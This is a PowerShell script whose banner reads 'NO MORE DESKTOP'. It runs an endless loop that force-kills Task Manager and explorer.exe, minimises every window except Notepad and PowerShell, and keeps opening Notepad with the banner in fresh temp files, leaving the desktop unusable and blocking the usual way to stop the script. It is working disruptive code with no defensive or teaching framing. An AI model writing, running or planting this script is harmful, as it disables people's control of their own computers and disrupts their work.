# Add necessary .NET functions to interact with windows
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll")]
    public static extern bool ShowWindowAsync(IntPtr hWnd, int nCmdShow);

    [DllImport("user32.dll")]
    public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
}
"@

$banner = @"
 __   _   ______    _   __   ______   _____    _____
|  \ | | /  __  \  | \_/  | /  __  \ |  _  \  |  ___|
| \ \| | | |  | |  |      | | |  | | | |_)  | | |___
| |\ ' | | |  | |  | |\/| | | |  | | |  _  /  |  ___|
| | \  | | |__| |  | |  | | | |__| | | | \ \  | |___
|_|  \_| \______/  |_|  |_| \______/ |_|  \_\ |_____|

 _____    _____    ______   _    _   _______   ______   _____
|  __ \  |  ___|  /  ____| | |  / / |__   __| /  __  \ |  _  \
| |  | | | |___  |  (___   | |_/ /     | |    | |  | | | |_)  | 
| |  | | |  ___|  \__   \  |  _ |      | |    | |  | | |  __ /
| |__| | | |___   ____)  | | | \ \     | |    | |__| | | |  
|_____/  |_____| |______/  |_|  \_\    |_|    \______/ |_| 
"@

# Function to minimize all windows except Notepad
function Minimize-AllExceptNotepad {
    $shell = New-Object -ComObject "Shell.Application"
    $windows = $shell.Windows()

    foreach ($window in $windows) {
        try {
            $processName = $window.FullName | Split-Path -leaf
            if ($processName -ne "notepad.exe" -and $processName -ne "powershell.exe") {
                $window.Minimize()
            }
        } catch {}
    }
}

# Loop that kills explorer.exe every 20 seconds, closes Task Manager every 6 seconds, and minimizes all except Notepad
while ($true) {
    # Minimize all open windows except Notepad
    Minimize-AllExceptNotepad

    # Close Task Manager
    taskkill /F /IM taskmgr.exe

    # Minimize all PowerShell instances
    $powershellProcesses = Get-Process powershell -ErrorAction SilentlyContinue
    foreach ($proc in $powershellProcesses) {
        $hWnd = [User32]::FindWindow($null, $proc.MainWindowTitle)
        if ($hWnd -ne 0) {
            [User32]::ShowWindowAsync($hWnd, 6)  # 6 = Minimize
        }
    }

    # Kill explorer.exe
    taskkill /F /IM explorer.exe

    # Wait for 20 seconds before restarting explorer
    Start-Sleep -Seconds 20

    # Restart explorer.exe
    Start-Process "explorer.exe"

    # Open Notepad with the banner text every 2 seconds
    $tempFile = [System.IO.Path]::GetTempFileName() + ".txt"
    $banner | Out-File -FilePath $tempFile
    Start-Process notepad.exe $tempFile

    # Wait for 6 seconds before closing Task Manager again
    Start-Sleep -Seconds 6
}
